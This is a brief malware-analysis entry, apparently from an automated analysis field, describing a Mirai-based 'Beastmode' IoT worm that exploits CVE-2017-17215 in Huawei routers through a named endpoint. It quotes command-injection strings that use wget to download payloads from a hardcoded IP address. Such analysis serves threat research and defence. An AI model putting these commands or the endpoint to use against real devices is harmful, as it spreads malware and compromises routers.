crowdsourced_ai_results.analysis: The sample is an IoT worm, likely a variant of the Mirai-based 'Beastmode' malware. It spreads by scanning the network for vulnerable devices and exploiting a known remote command execution vulnerability in Huawei routers (CVE-2017-17215) via a POST request to `/ctrlt/DeviceUpgrade_1`. It downloads and executes further payloads from the hardcoded IP address 91.92.240.69, as seen in the command injection strings 'wget 91.92.240.69/beastmode/b3astmode.arm7' and 'wget -g 91.92.240.69 ... /beastmode/b'.
